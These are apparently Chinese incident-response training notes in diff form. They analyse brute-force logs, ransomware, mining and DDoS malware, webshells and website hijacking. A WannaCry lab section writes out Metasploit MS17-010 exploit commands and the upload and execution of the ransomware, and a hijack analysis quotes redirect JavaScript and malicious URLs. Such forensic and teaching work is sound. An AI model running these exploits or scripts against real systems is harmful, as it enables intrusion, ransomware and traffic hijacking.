+<img style="aspect-ratio:1582/226" decoding="async" loading="lazy" src="./images/img_20230817_140709.webp" alt="img_20230817_140709.webp" width="50%">
+
+</figure>
+</div>
+</div>
+</div>
+</section>
+<section id="outline-container-h:a37c3f0c-da61-446b-a906-01ee5e3ca183" class="outline-2">
+<h2 id="h:a37c3f0c-da61-446b-a906-01ee5e3ca183"><a href="#h:a37c3f0c-da61-446b-a906-01ee5e3ca183">Windows 实战</a></h2>
+<div class="outline-text-2" id="text-h:a37c3f0c-da61-446b-a906-01ee5e3ca183">
+<p>
+主要内容：
+</p>
+<ul class="org-ul">
+<li>FTP 暴力破解</li>
+<li>勒索病毒</li>
+<li>挖矿病毒</li>
+</ul>
+</div>
+<div id="outline-container-h:2e1d1a9c-0a75-4a2f-89bc-8749186fce91" class="outline-3">
+<h3 id="h:2e1d1a9c-0a75-4a2f-89bc-8749186fce91"><a href="#h:2e1d1a9c-0a75-4a2f-89bc-8749186fce91">FTP暴力破解</a></h3>
+<div class="outline-text-3" id="text-h:2e1d1a9c-0a75-4a2f-89bc-8749186fce91">
+<p>
+FTP是一个文件传输协议，用户通过FTP可从客户机程序向远程主机上传或下载文件，常用于网站代码维护、日常源码备份等。如果攻击者通过FTP匿名访问或者弱口令获取FTP权限，可直接上传webshell，进一步渗透提权，直至控制整个网站服务器。
+</p>
+
+<p>
+eventvwr.msc，发现大量登录任务类别。
+</p>
+
+
+<figure id="org28a7618">
+<img style="aspect-ratio:1564/750" decoding="async" loading="lazy" src="./images/img_20230817_140745.webp" alt="img_20230817_140745.webp" width="50%">
+
+</figure>
+
+<p>
+筛选当前日志，事件id填写4625
+</p>
+
+
+<figure id="org2dc240e">
+<img style="aspect-ratio:1574/948" decoding="async" loading="lazy" src="./images/img_20230817_140759.webp" alt="img_20230817_140759.webp" width="50%">
+
+</figure>
+
+<p>
+发现存在1248条，猜测服务器正在被人暴力破解。
+</p>
+
+
+<figure id="org39d381c">
+<img style="aspect-ratio:1584/660" decoding="async" loading="lazy" src="./images/img_20230817_140852.webp" alt="img_20230817_140852.webp" width="50%">
+
+</figure>
+
+<p>
+将筛选出来的日志另存为：暴力破解
+</p>
+
+
+<figure id="org8476a2e">
+<img style="aspect-ratio:1588/870" decoding="async" loading="lazy" src="./images/img_20230817_140908.webp" alt="img_20230817_140908.webp" width="50%">
+
+</figure>
+
+<p>
+进一步使用Log Parser对日志提取数据分析，发现攻击者使用了大量的用户名进行爆破，例如用户名：fxxx，共计进行了17826次口令尝试，攻击者基于“fxxx”这样一个域名信息，构造了一系列的用户名字典进行有针对性进行爆破，如下图：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">LogParser.exe -i:EVT <span class="org-string">"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,EXTRACT_TOKEN(Message,19,' ') as user,count(EXTRACT_TOKEN(Message,19,' ')) as times,EXTRACT_TOKEN(Message,38,' ') as Loginip FROM &#26292;&#21147;&#30772;&#35299;.evtx where EventID=4625 group by message"</span>
+</pre>
+</div>
+
+
+<figure id="org6f867b0">
+<img style="aspect-ratio:1582/874" decoding="async" loading="lazy" src="./images/img_20230817_141016.webp" alt="img_20230817_141016.webp" width="50%">
+
+</figure>
+
+<p>
+发现EventType为8的时候攻击者进行爆破次数最多。
+</p>
+
+<p>
+登录类型8：为网络明文（NetworkCleartext）
+</p>
+
+<p>
+这种登录表明这是一个像类型3一样的网络登录，但是这种登录的密码在网络上是通过明文传输的，WindowsServer服务是不允许通过明文验证连接到共享文件夹或打印机的，通常只有当从一个使用Advapi的ASP脚本登录或者一个用户使用基本验证方式登录IIS才会是这种登录类型。“登录过程”栏都将列出Advapi。我们推测可能是FTP服务：
+</p>
+
+
+<figure id="orgaa2c5a9">
+<img style="aspect-ratio:1566/376" decoding="async" loading="lazy" src="./images/img_20230817_141052.webp" alt="img_20230817_141052.webp" width="50%">
+
+</figure>
+
+<p>
+<b>应急处理措施：</b>
+</p>
+<ol class="org-ol">
+<li>关闭外网FTP端口映射</li>
+<li>删除本地服务器FTP测试</li>
+<li>禁止使用FTP传输文件，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于8位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。</li>
+<li>更改服务器FTP默认端口。</li>
+<li>部署入侵检测设备，增强安全防护。</li>
+</ol>
+</div>
+</div>
+<div id="outline-container-h:380cb457-03cf-4b88-86f0-bcf17077542f" class="outline-3">
+<h3 id="h:380cb457-03cf-4b88-86f0-bcf17077542f"><a href="#h:380cb457-03cf-4b88-86f0-bcf17077542f">勒索病毒</a></h3>
+<div class="outline-text-3" id="text-h:380cb457-03cf-4b88-86f0-bcf17077542f">
+<p>
+“永恒之蓝”利用Windows系统的SMB漏洞获取系统的最高权限，该工具通过恶意代码扫描开放445端口的Windows系统；被扫描到的Windows系统，只要开机上线，不要要用户进行任何操作，即可通过共享漏洞上传wannacry勒索病毒，远程控制木马等恶意程序。
+</p>
+
+<p>
+WannaCry是在永恒之蓝的基础上产生的，因此需要先通过永恒之蓝获得shell权限。
+</p>
+
+<p>
+永恒之蓝的编号是MS17-010，先使用msfconsole搜索一下漏洞模块
+</p>
+
+
+<figure id="org1ae86fe">
+<img style="aspect-ratio:1976/376" decoding="async" loading="lazy" src="./images/img_20230817_141205.webp" alt="img_20230817_141205.webp" width="50%">
+
+</figure>
+
+<p>
+使用扫描模块进行扫描
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">use auxiliary/scanner/smb/smb_ms17_010
+<span class="org-builtin">set</span> rhosts 192.168.85.188
+<span class="org-builtin">set</span> rport 445
+
+exploit
+</pre>
+</div>
+
+<p>
+发现目标主机存在ms17-010漏洞
+</p>
+
+
+<figure id="orgd5138a8">
+<img style="aspect-ratio:1974/342" decoding="async" loading="lazy" src="./images/img_20230817_141313.webp" alt="img_20230817_141313.webp" width="50%">
+
+</figure>
+
+<p>
+接下来使用攻击模块进行攻击
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">use exploit/windows/smb/ms17_010_eternalblue
+<span class="org-builtin">set</span> rhosts 192.168.85.188
+exploit
+</pre>
+</div>
+
+<p>
+攻击成功，上传WannaCry病毒，upload <i>tmp/wannacry.exe c:/</i>
+</p>
+
+<p>
+然后执行wannacry.exe，发现主机系统已经被勒索病毒攻击：
+</p>
+
+
+<figure id="orgd4a3775">
+<img style="aspect-ratio:1574/862" decoding="async" loading="lazy" src="./images/img_20230817_141510.webp" alt="img_20230817_141510.webp" width="50%">
+
+</figure>
+
+<p>
+一旦中了勒索病毒，文件会被锁死，没有办法正常访问了，这时候，会给使用者带来极大的困恼。为了防范这样的事情出现，我们电脑上要先做好一些防范措施：
+</p>
+<ol class="org-ol">
+<li>安装杀毒软件，保持监控开启，定期全盘扫描</li>
+<li>及时更新 Windows安全补丁，开启防火墙临时关闭端口，如445、135、137、138、139、3389等端口</li>
+<li>及时更新web漏洞补丁，升级web组件</li>
+<li>备份。重要的资料一定要备份，谨防资料丢失</li>
+<li>强化网络安全意识，陌生链接不点击，陌生文件不要下载，陌生邮件不要打开</li>
+</ol>
+</div>
+</div>
+<div id="outline-container-h:606725a8-8982-4693-ac45-a6a116b98cf2" class="outline-3">
+<h3 id="h:606725a8-8982-4693-ac45-a6a116b98cf2"><a href="#h:606725a8-8982-4693-ac45-a6a116b98cf2">挖矿病毒</a></h3>
+<div class="outline-text-3" id="text-h:606725a8-8982-4693-ac45-a6a116b98cf2">
+<p>
+随着虚拟货币的疯狂炒作，挖矿病毒已经成为不法分子利用最为频繁的攻击方式之一。病毒传播者可以利用个人电脑或服务器进行挖矿，具体现象为电脑CPU占用率高，C盘可使用空间骤降，电脑温度升高，风扇噪声增大等问题。
+</p>
+
+<p>
+<b>挖矿病毒案例：</b>
+</p>
+<ul class="org-ul">
+<li>某天上午重启服务器的时候，发现程序启动很慢，打开任务管理器，发现cpu被占用接近100%，服务器资源占用严重。</li>
+</ul>
+
+
+<figure id="orgb74484d">
+<img style="aspect-ratio:1564/856" decoding="async" loading="lazy" src="./images/img_20230817_141704.webp" alt="img_20230817_141704.webp" width="50%">
+
+</figure>
+
+<p>
+登录网站服务器进行排查，发现多个异常进程：
+</p>
+
+
+<figure id="org6525ff1">
+<img style="aspect-ratio:1574/1028" decoding="async" loading="lazy" src="./images/img_20230817_141718.webp" alt="img_20230817_141718.webp" width="50%">
+
+</figure>
+
+<p>
+分析进程参数：wmic process get caption,commandline /value &gt;&gt; tmp.txt
+</p>
+
+
+<figure id="org2fc1df6">
+<img style="aspect-ratio:1574/904" decoding="async" loading="lazy" src="./images/img_20230817_141739.webp" alt="img_20230817_141739.webp" width="50%">
+
+</figure>
+
+<p>
+访问该链接：<a href="http://45.123.190.178/win.txt">http://45.123.190.178/win.txt</a>
+</p>
+
+
+<figure id="org91b1eb2">
+<img style="aspect-ratio:1584/480" decoding="async" loading="lazy" src="./images/img_20230817_141755.webp" alt="img_20230817_141755.webp" width="50%">
+
+</figure>
+
+<p>
+Temp目录下发现Carbon、run.bat挖矿程序:
+</p>
+
+
+<figure id="org889f207">
+<img style="aspect-ratio:792/390" decoding="async" loading="lazy" src="./images/img_20230817_141819.webp" alt="img_20230817_141819.webp" width="50%">
+
+</figure>
+
+<p>
+清除挖矿病毒：关闭异常进程、删除c盘temp目录下挖矿程序 。
+</p>
+</div>
+</div>
+</section>
+<section id="outline-container-h:c1741471-1dc6-42cc-9e32-9db2318148be" class="outline-2">
+<h2 id="h:c1741471-1dc6-42cc-9e32-9db2318148be"><a href="#h:c1741471-1dc6-42cc-9e32-9db2318148be">Linux 实战</a></h2>
+<div class="outline-text-2" id="text-h:c1741471-1dc6-42cc-9e32-9db2318148be">
+</div>
+<div id="outline-container-h:8c07cd81-c67c-4f47-b602-0575e35a8385" class="outline-3">
+<h3 id="h:8c07cd81-c67c-4f47-b602-0575e35a8385"><a href="#h:8c07cd81-c67c-4f47-b602-0575e35a8385">SSH暴力破解</a></h3>
+<div class="outline-text-3" id="text-h:8c07cd81-c67c-4f47-b602-0575e35a8385">
+<p>
+SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议，主要用于给远程登录会话数据进行加密，保证数据传输的安全。SSH口令长度太短或者复杂度不够，如仅包含数字，或仅包含字母等，容易被攻击者破解，一旦被攻击者获取，可用来直接登录系统，控制服务器所有权限。
+</p>
+
+<p>
+日志分析：
+</p>
+<ul class="org-ul">
+<li>SSH端口异常，我们首先有必要先来了解一下系统账号情况：</li>
+</ul>
+
+<p>
+<b>1、系统账号情况</b>
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">1&#12289;&#38500;root&#20043;&#22806;&#65292;&#26159;&#21542;&#36824;&#26377;&#20854;&#23427;&#29305;&#26435;&#29992;&#25143;(uid &#20026;0)
+[root@localhost ~]# awk -F: <span class="org-string">'$3==0{print $1}'</span> /etc/passwd
+root
+
+2&#12289;&#21487;&#20197;&#36828;&#31243;&#30331;&#24405;&#30340;&#36134;&#21495;&#20449;&#24687;
+[root@localhost ~]# awk <span class="org-string">'/\$1|\$6/{print $1}'</span> /etc/shadow
+root:$<span class="org-variable-name">6</span>$<span class="org-variable-name">38</span>cKfZDjsTiUe58V$<span class="org-variable-name">FP</span>.UHWMObqeUQS1Z2KRj/4EEcOPi.6d1XmKHgK3j3GY9EGvwwBei7nU bbqJC./qK12HN8jFuXOfEYIKLID6hq0::0:99999:7:::
+</pre>
+</div>
+
+<p>
+可以确认目前系统只有一个管理用户root。
+</p>
+
+<p>
+/var/log/auth.log，这个日志文件记录了验证和授权方面的信息，只要涉及账号和密码的程序都会进行记录。
+</p>
+
+<p>
+<b>2、确认攻击情况</b>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">1&#12289;&#32479;&#35745;&#20102;&#19979;&#26085;&#24535;&#65292;&#21457;&#29616;&#22823;&#32422;&#26377;126254&#27425;&#30331;&#24405;&#22833;&#36133;&#30340;&#35760;&#24405;&#65292;&#30830;&#35748;&#26381;&#21153;&#22120;&#36973;&#21463;&#26292;&#21147;&#30772;&#35299;
+[root@localhost ~]# grep -o <span class="org-string">"Failed password"</span> /var/log/auth.log|uniq -c
+    340 Failed password
+
+2&#12289;&#36755;&#20986;&#30331;&#24405;&#29190;&#30772;&#30340;&#31532;&#19968;&#34892;&#21644;&#26368;&#21518;&#19968;&#34892;&#65292;&#30830;&#35748;&#29190;&#30772;&#26102;&#38388;&#33539;&#22260;&#65306;
+[root@localhost ~]# grep <span class="org-string">"Failed password"</span> /var/log/auth.log|head -1
+Apr 17 02:49:50 iZf4lv0p98ie33Z sshd[2254791]: Failed password for invalid user suprodip from 81.200.212.13 port 53142 ssh2
+[root@localhost ~]# grep <span class="org-string">"Failed password"</span> /var/log/auth.log|tail -1
+Apr 20 07:58:27 iZf4lv0p98ie33Z sshd[2309531]: Failed password for invalid user dspace from 92.255.85.135 port 58190 ssh2
+
+3&#12289;&#36827;&#19968;&#27493;&#23450;&#20301;&#26377;&#21738;&#20123;IP&#22312;&#29190;&#30772;&#65311;
+[root@localhost ~]# grep <span class="org-string">"Failed password"</span> /var/log/auth.log|grep -E -o <span class="org-string">"(25[0- 5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0- 5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"</span>|uniq -c | sort -nr
+173 31.184.198.71
+12 31.184.198.71
+7 147.182.139.154
+6 103.47.50.211
+... ...
+
+4&#12289;&#29190;&#30772;&#29992;&#25143;&#21517;&#23383;&#20856;&#37117;&#26377;&#21738;&#20123;&#65311;
+[root@localhost ~]# grep <span class="org-string">"Failed password"</span> /var/log/auth.log|perl -e <span class="org-string">'while($_= &lt;&gt;){ /for(.*?) from/; print "$1\n";}'</span>|uniq -c|sort -nr
+135 invalid user 111111
+18 invalid user 123
+15 invalid user
+12 invalid user 123
+11 root
+3 root
+... ...
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:db79cc82-db3f-40da-9805-1c94bd82a73c" class="outline-3">
+<h3 id="h:db79cc82-db3f-40da-9805-1c94bd82a73c"><a href="#h:db79cc82-db3f-40da-9805-1c94bd82a73c">DDOS病毒</a></h3>
+<div class="outline-text-3" id="text-h:db79cc82-db3f-40da-9805-1c94bd82a73c">
+<p>
+现象描述：某服务器网络资源异常，感染该木马病毒的服务器会占用网络带宽，甚至影响网络业务正常应用。
+</p>
+
+<p>
+系统分析：针对日志服务器病毒事件进行排查，在开机启动项/etc/rc.d/rc.local发现可疑的sh.sh脚本，进一步跟踪sh.sh脚本，这是一个检测病毒存活的脚本。
+</p>
+
+<p>
+在root目录下发现存活检测脚本
+</p>
+
+
+<figure id="org15b49b5">
+<img style="aspect-ratio:1572/894" decoding="async" loading="lazy" src="./images/img_20230817_142352.webp" alt="img_20230817_142352.webp" width="50%">
+
+</figure>
+
+<p>
+解决步骤
+</p>
+<ol class="org-ol">
+<li>结束进程ps aux | grep "conf.m" | grep -v grep | awk ‘{print $2}‘| xargs kill -9</li>
+<li>清除自动启动脚本vim /etc/rc.local 去掉 sh /etc/chongfu.sh &amp;</li>
+<li>清除 脚本 rm -rf /etc/chongfu.sh /tem/chongfu.sh</li>
+<li>修改登录密码 passwd 5、重启，reboot</li>
+</ol>
+</div>
+</div>
+</section>
+<section id="outline-container-h:5c22d99b-c7db-4c77-b808-3d9cd071c24f" class="outline-2">
+<h2 id="h:5c22d99b-c7db-4c77-b808-3d9cd071c24f"><a href="#h:5c22d99b-c7db-4c77-b808-3d9cd071c24f">Web 实战</a></h2>
+<div class="outline-text-2" id="text-h:5c22d99b-c7db-4c77-b808-3d9cd071c24f">
+<p>
+主要内容：
+</p>
+<ul class="org-ul">
+<li>网站被植入 webshell</li>
+<li>批量挂黑页</li>
+<li>新闻源网站劫持</li>
+<li>搜索引擎劫持</li>
+<li>网站首页被篡改</li>
+<li>管理员账号被篡改</li>
+<li>编辑器入侵事件</li>
+<li>应急响应报告模板</li>
+</ul>
+</div>
+<div id="outline-container-h:d5942152-8df5-4cfb-92b9-26b8b040cb8c" class="outline-3">
+<h3 id="h:d5942152-8df5-4cfb-92b9-26b8b040cb8c"><a href="#h:d5942152-8df5-4cfb-92b9-26b8b040cb8c">网站被植入Webshell</a></h3>
+<div class="outline-text-3" id="text-h:d5942152-8df5-4cfb-92b9-26b8b040cb8c">
+<p>
+<b>使用环境：Windows Server 2008 + phpstudy + DVWA</b>
+</p>
+
+<p>
+网站被植入Webshell，意味着网站存在可利用的高危漏洞，攻击者通过利用漏洞入侵网站，写入Webshell接管网站的控制权。为了得到权限 ，常规的手段如：前后台任意文件上传，远程命令执行，Sql注入写入文件等。
+</p>
+
+<p>
+网站管理员在站点目录下发现存在webshell，于是开始了对入侵过程展开了分析。发现被web目录被植入了Webshell：
+</p>
+
+
+<figure id="org939037d">
+<img style="aspect-ratio:1362/246" decoding="async" loading="lazy" src="./images/img_20230817_142521.webp" alt="img_20230817_142521.webp" width="50%">
+
+</figure>
+
+<p>
+Webshell查杀工具
+</p>
+<ul class="org-ul">
+<li>D盾_Web查杀 <a href="http://www.d99net.net/index.asp">http://www.d99net.net/index.asp</a></li>
+<li>河马 <a href="https://www.shellpub.com">https://www.shellpub.com</a></li>
+<li>等</li>
+</ul>
+
+<p>
+使用方法
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">wget http://down.shellpub.com/hm/latest/hm-linux-amd64.tgz
+tar xvf hm-linux-amd64.tgz
+hm scan /www
+</pre>
+</div>
+
+<p>
+事件分析，通过发现的webshell文件创建时间点，去翻看相关日期的访问日志。
+</p>
+
+
+<figure id="org7d4ac31">
+<img style="aspect-ratio:1556/236" decoding="async" loading="lazy" src="./images/img_20230817_144224.webp" alt="img_20230817_144224.webp" width="50%">
+
+</figure>
+
+<p>
+Web日志分析
+</p>
+
+<p>
+经过日志分析，在文件创建的时间节点发现可疑的上传接口：cat /var/log/apache2/access.log
+</p>
+
+
+<figure id="org52e710f">
+<img style="aspect-ratio:1978/246" decoding="async" loading="lazy" src="./images/img_20230817_144252.webp" alt="img_20230817_144252.webp" width="50%">
+
+</figure>
+
+<p>
+漏洞复现：访问文件上传接口
+</p>
+
+
+<figure id="org9fadf4e">
+<img style="aspect-ratio:1186/714" decoding="async" loading="lazy" src="./images/img_20230817_144309.webp" alt="img_20230817_144309.webp" width="50%">
+
+</figure>
+
+<p>
+成功上传Webshell
+</p>
+
+
+<figure id="orgaa7c466">
+<img style="aspect-ratio:1188/564" decoding="async" loading="lazy" src="./images/img_20230817_144326.webp" alt="img_20230817_144326.webp" width="50%">
+
+</figure>
+
+<p>
+漏洞修复：清除webshell并对上传接口进行代码修复。
+</p>
+</div>
+</div>
+<div id="outline-container-h:bad43e8b-fba8-43d2-a4c0-707e42f7404b" class="outline-3">
+<h3 id="h:bad43e8b-fba8-43d2-a4c0-707e42f7404b"><a href="#h:bad43e8b-fba8-43d2-a4c0-707e42f7404b">批量挂黑页</a></h3>
+<div class="outline-text-3" id="text-h:bad43e8b-fba8-43d2-a4c0-707e42f7404b">
+<p>
+作为一个网站管理员，你采用开源CMS做网站，比如dedecms，但是有一天，你忽然发现不知何时，网站的友情链接模块被挂大量垃圾链接，网站出现了很多不该有的目录，里面全是博彩相关的网页。而且，攻击者在挂黑页以后，会在一些小论坛注册马甲将你的网站黑页链接发到论坛，引爬虫收录。在搜索引擎搜索网站地址时，收录了一些会出现一些博彩页面，严重影响了网站形象。
+</p>
+
+<p>
+<b>原因分析：</b>
+</p>
+
+<p>
+网站存在高危漏洞，常见于一些存在安全漏洞的开源CMS，利用0day批量拿站上传黑页。
+</p>
+
+<p>
+某网站被挂了非常多博彩链接，链接形式如下：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">http://www.xxx.com/upload/aomendduchangzaixiandobo/index.html
+http://www.xxx.com/upload/aomendduchangzaixian/index.html
+http://www.xxx.com/upload/aomenzhengguidubowangzhan/index.html
+</pre>
+</div>
+
+<p>
+链接可以访问，直接访问物理路径也可以看到文件，但是打开网站目录并没有发现这些文件，这些文件到底藏在了哪？
+</p>
+
+<p>
+访问这些链接，跳转到如图页面：
+</p>
+
+
+<figure id="org24d60a4">
+<img style="aspect-ratio:504/694" decoding="async" loading="lazy" src="./images/img_20230817_144432.webp" alt="img_20230817_144432.webp" width="50%">
+
+</figure>
+
+<p>
+<b>问题处理：</b>
+</p>
+
+<p>
+1、打开电脑文件夹选项卡，取消”隐藏受保护的操作系统文件“勾选，把”隐藏文件和文件夹“下面的单选选择“显示隐藏的文件、文件夹和驱动器”。
+</p>
+
+
+<figure id="orgc3c559b">
+<img style="aspect-ratio:846/946" decoding="async" loading="lazy" src="./images/img_20230817_144512.webp" alt="img_20230817_144512.webp" width="50%">
+
+</figure>
+
+<p>
+2、再次查看，可以看到半透明的文件夹，清楚隐藏文件夹及所有页面
+</p>
+
+
+<figure id="org4ac7bc9">
+<img style="aspect-ratio:1584/292" decoding="async" loading="lazy" src="./images/img_20230817_144532.webp" alt="img_20230817_144532.webp" width="50%">
+
+</figure>
+
+<p>
+3、然后清除IIS临时压缩文件
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">C:\inetpub\temp\IIS Temporary Compressed Files\WEBUI$^_gzip_D^\WEB\WEBUI\UPLOAD
+</pre>
+</div>
+
+
+<figure id="org50484ad">
+<img style="aspect-ratio:1568/756" decoding="async" loading="lazy" src="./images/img_20230817_144557.webp" alt="img_20230817_144557.webp" width="50%">
+
+</figure>
+
+<p>
+4、删除相关的网页收录，减少对网站的影响。
+</p>
+</div>
+</div>
+<div id="outline-container-h:608dcf4f-e4b5-402f-8b6c-cb2e6588b04d" class="outline-3">
+<h3 id="h:608dcf4f-e4b5-402f-8b6c-cb2e6588b04d"><a href="#h:608dcf4f-e4b5-402f-8b6c-cb2e6588b04d">新闻源网站劫持</a></h3>
+<div class="outline-text-3" id="text-h:608dcf4f-e4b5-402f-8b6c-cb2e6588b04d">
+<p>
+新闻源网站一般权重较高，收录快，能够被搜索引擎优先收录，是黑灰产推广引流的必争之地，很容易成为被攻击的对象。被黑以后主要挂的不良信息内容主要是博彩六合彩等赌博类内容，新闻源网站程序无论是自主开发的还是开源程序，都有被黑的可能，开源程序更容易被黑。
+</p>
+
+<p>
+<b>现象描述：</b>
+</p>
+<ul class="org-ul">
+<li>某新闻源网站首页广告链接被劫持到博彩网站</li>
+</ul>
+
+
+<figure id="orgf7a0ba8">
+<img style="aspect-ratio:1572/436" decoding="async" loading="lazy" src="./images/img_20230817_144639.webp" alt="img_20230817_144639.webp" width="50%">
+
+</figure>
+
+<p>
+有三个广告专题，链接形式如下：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">http://www.xxx.cn/zhuanti/yyysc/index.shtml
+http://www.xxx.cn/zhuanti/wwwsc/index.shtml
+http://www.xxx.cn/zhuanti/zzzsc/index.shtml
+</pre>
+</div>
+
+<p>
+点击这三条链接会跳转到博彩网站。简单抓包分析一下过程：
+</p>
+
+
+<figure id="org32407fc">
+<img style="aspect-ratio:1966/828" decoding="async" loading="lazy" src="./images/img_20230817_144724.webp" alt="img_20230817_144724.webp" width="50%">
+
+</figure>
+
+<p>
+可以发现此时这个返回页面已被劫持，并且加载了第三方js文件，<a href="http://xn--dpqw2zokj.com/N/js/dt.js">http://xn--dpqw2zokj.com/N/js/dt.js</a> ，进一步访问该文件：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">var <span class="org-variable-name">_hmt</span> = _hmt || [];
+(<span class="org-keyword">function</span>() {
+     var <span class="org-variable-name">hm</span> = document.createElement(<span class="org-string">"script"</span>);
+     hm.src = <span class="org-string">"https://hm.baidu.com/hm.js?5fa93dff27c1ac39be066ba260b14556"</span>;
+     var <span class="org-variable-name">s</span> = document.getElementsByTagName(<span class="org-string">"script"</span>)[0];
+     s.parentNode.insertBefore(hm, s);
+ })();
+
+<span class="org-function-name">document.writeln</span>(<span class="org-string">"&lt;script language=\"javascript\" src=\"http://xn-- dpqw2zokj.com/N/js/yz.js\"&gt;&lt;\/script&gt;"</span>);
+</pre>
+</div>
+
+<p>
+dt.js进一步加载了另一条js，访问<a href="http://xn--dpqw2zokj.com/N/js/yz.js">http://xn--dpqw2zokj.com/N/js/yz.js</a>
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">window.location=<span class="org-string">"https://lemcoo.com/?dt"</span>;
+</pre>
+</div>
+
+<p>
+我们发现链接跳转到<a href="https://lemcoo.com/?dt">https://lemcoo.com/?dt</a> ，进一步访问这个链接，网站为博彩链接导航网站，访问后会随机跳转到第三方赌博网站。
+</p>
+
+<p>
+<b>问题处理：</b>
+</p>
+
+<p>
+找到url对应的文件位置，删除。
+</p>
+
+<p>
+找到url对应的文件位置，即使文件被删除，链接依然可以访问，可以发现三条链接都是以“sc”后缀。
+</p>
+
+<p>
+对Nginx配置文件进行排查，发现Nginx配置文件VirtualHost.conf被篡改，通过反向代理匹配以“sc”后缀的专题链接，劫持到<a href="http://103.233.248.163">http://103.233.248.163</a> ，该网站为博彩链接导航网站。
+</p>
+
+
+<figure id="org4e6c508">
+<img style="aspect-ratio:1580/604" decoding="async" loading="lazy" src="./images/img_20230817_145007.webp" alt="img_20230817_145007.webp" width="50%">
+
+</figure>
+
+<p>
+删除恶意代理后，专题链接访问恢复。
+</p>
+</div>
+</div>
+<div id="outline-container-h:98272edc-c33e-4bcd-983c-c11c06aece65" class="outline-3">
+<h3 id="h:98272edc-c33e-4bcd-983c-c11c06aece65"><a href="#h:98272edc-c33e-4bcd-983c-c11c06aece65">搜索引擎劫持</a></h3>
+<div class="outline-text-3" id="text-h:98272edc-c33e-4bcd-983c-c11c06aece65">
+<p>
+当你直接打开网址访问网站，是正常的，可是当你在搜索引擎结果页中打开网站时，会跳转到一些其他网站，比如博彩，虚假广告，淘宝搜索页面等。是的，你可能了遇到搜索引擎劫持。
+</p>
+
+<p>
+从搜索引擎来的流量自动跳转到指定的网页
+</p>
+
+<p>
+通过对index.php文件进行代码分析，发现该文件代码 对来自搜狗和好搜的访问进行流量劫持。
+</p>
+
+
+<figure id="org177f22b">
+<img style="aspect-ratio:1578/260" decoding="async" loading="lazy" src="./images/img_20230817_145033.webp" alt="img_20230817_145033.webp" width="50%">
+
+</figure>
+
+<p>
+进一步跟踪include函数包含的文件，index.php包含/tmp/.ICE-unix/.. /c.jpg。
+</p>
+
+
+<figure id="org0f41663">
+<img style="aspect-ratio:1578/992" decoding="async" loading="lazy" src="./images/img_20230817_145048.webp" alt="img_20230817_145048.webp" width="50%">
+
+</figure>
+
+<p>
+进入/tmp目录进行查看，发现该目录下，如c.jpg等文件，包含着一套博彩劫持的程序。
+</p>
+
+
+<figure id="org9113a98">
+<img style="aspect-ratio:1572/326" decoding="async" loading="lazy" src="./images/img_20230817_145107.webp" alt="img_20230817_145107.webp" width="50%">
+
+</figure>
+</div>
+</div>
+<div id="outline-container-h:c930cda1-884f-4fe5-9d6d-d98c5dddbb61" class="outline-3">
+<h3 id="h:c930cda1-884f-4fe5-9d6d-d98c5dddbb61"><a href="#h:c930cda1-884f-4fe5-9d6d-d98c5dddbb61">网站首页被篡改</a></h3>
+<div class="outline-text-3" id="text-h:c930cda1-884f-4fe5-9d6d-d98c5dddbb61">
+<p>
+网站首页被非法篡改，当你一打开网站就知道自己的网站出现了安全问题，网站程序存在严重的安全漏洞，攻击者通过上传脚本木马，从而对网站内容进行篡改。而这种篡改事件在某些场景下的影响，会被无限放大。
+</p>
+
+<p>
+现象描述：网站首页被恶意篡改，比如复制原来的图片，PS一下，然后替换上去。
+</p>
+
+<p>
+问题处理：
+</p>
+
+<p>
+确认篡改时间：通过对被篡改的图片进行查看，确认图片篡改时间为2018年04月18日 19:24:07 。
+</p>
+
+<p>
+访问日志溯源：通过图片修改的时间节点，发现可疑IP：113.xx.xx.24 （代理IP，无法追溯真实来源），访问image.jsp（脚本木马），并随后访问了被篡改的图片地址。
+</p>
+
+
+<figure id="org1ec8132">
+<img style="aspect-ratio:1572/652" decoding="async" loading="lazy" src="./images/img_20230817_145153.webp" alt="img_20230817_145153.webp" width="50%">
+
+</figure>
+
+<p>
+进一步审查所有的日志文件(日志保存时间从2017-04-20至2018-04-19)，发现一共只有两次访问image.jsp文件的记录，分别是2018-04-18和2017-09-21。
+</p>
+
+
+<figure id="orgb97fbbc">
+<img style="aspect-ratio:1558/246" decoding="async" loading="lazy" src="./images/img_20230817_145211.webp" alt="img_20230817_145211.webp" width="50%">
+
+</figure>
+
+<p>
+image.jsp在2017-09-21之前就已经上传到网站服务器，已经潜藏长达半年多甚至更久的时间。
+</p>
+
+<p>
+<b>事件分析：</b>
+</p>
+
+<p>
+发现站点目录下存在ROOT.rar全站源码备份文件，备份时间为2017-02-28 10:35
+</p>
+
+
+<figure id="orgad95ff3">
+<img style="aspect-ratio:1554/968" decoding="async" loading="lazy" src="./images/img_20230817_145252.webp" alt="img_20230817_145252.webp" width="50%">
+
+</figure>
+
+<p>
+通过对ROOT.rar解压缩，发现源码中存在的脚本木马与网站访问日志的可疑文件名一致（image.jsp）
+</p>
+
+
+<figure id="org66dfa37">
+<img style="aspect-ratio:1550/820" decoding="async" loading="lazy" src="./images/img_20230817_145306.webp" alt="img_20230817_145306.webp" width="50%">
+
+</figure>
+
+<p>
+根据这几个时间节点，我们尝试去还原攻击者的攻击路径，但是我们在访问日志并未找到ROOT.rar的访问下载记录，访问日志只保留了近一年的记录，而这个Webshell可能已经存在了多年。
+</p>
+
+<p>
+黑客是如何获取Webshell的呢？
+</p>
+
+<p>
